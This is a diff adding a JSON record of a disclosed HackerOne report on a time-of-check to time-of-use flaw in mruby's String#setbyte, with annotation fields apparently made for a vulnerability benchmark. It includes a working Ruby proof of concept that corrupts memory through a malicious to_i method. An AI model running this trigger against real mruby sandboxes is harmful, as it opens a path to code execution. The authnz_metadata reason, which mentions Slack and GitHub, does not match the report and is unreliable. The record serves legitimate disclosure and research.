@@ -1,0 +1,53 @@
+{
+  "reported_to": "shopify-scripts",
+  "reported_by": "raydot ",
+  "title": "TOCTTOU bug in mrb_str_setbyte leading the memory corruption",
+  "content": "\nThe String#setbyte function caches the length of the string before loading the function arguments. Loading function arguments through mrb_get_args can call into ruby code to run type conversion methods (to_i, to_s and the like). A malicious conversion method is able to force the string to be reallocated shorter so that the setbyte goes on to overwrite out of bounds memory.\nFollowing is a POC that causes a native crash with under mruby on Mac OS X. I plan to follow up with a reliable RCE exploit against mruby-engine using this vulnerability in the next day or so.\nCode 198 Bytes\n1$s = \"9\" + (\"\\n\" * (1024*1024-1))\n2$k = []\n3\n4class Tmp\n5    def to_i\n6        $k.push(\"a\"*1024)\n7        $s.chomp! ''\n8        $s.succ!\n9        95\n10    end\n11end\n12tmp = Tmp.new\n13$s.setbyte(128, tmp)\n14puts $k[0]\nAttached is a patch to mruby to resolve this issue.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1481942100,
+  "report_url": "https://hackerone.com/reports/181893",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Create a large string $s with '9' followed by many newlines"
+    ],
+    [
+      2,
+      "Define a class Tmp with a to_i method that modifies $s and $k"
+    ],
+    [
+      3,
+      "Call $s.setbyte(128, Tmp.new) which triggers the vulnerability"
+    ],
+    [
+      4,
+      "Observe memory corruption or crash due to out-of-bounds write"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Time-of-Check to Time-of-Use (TOCTTOU) bug in mrb_str_setbyte where the string length is cached before argument processing. During argument conversion (to_i), malicious Ruby code can modify the string, causing it to be reallocated shorter. This leads to an out-of-bounds write when the original cached length is used.",
+  "reason": "This vulnerability requires understanding of: 1) Ruby's method argument conversion process, 2) string memory management in mruby, 3) precise timing to trigger the TOCTTOU condition, and 4) crafting a malicious to_i method that modifies the string state during conversion. The interaction between these components is subtle and requires deep knowledge of mruby internals.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "since Slack and Github are independent applications, none of the steps would apply since they deal with user_session/user_ids scoped to the same application",
+    "is_detectable": false
+  }
+}
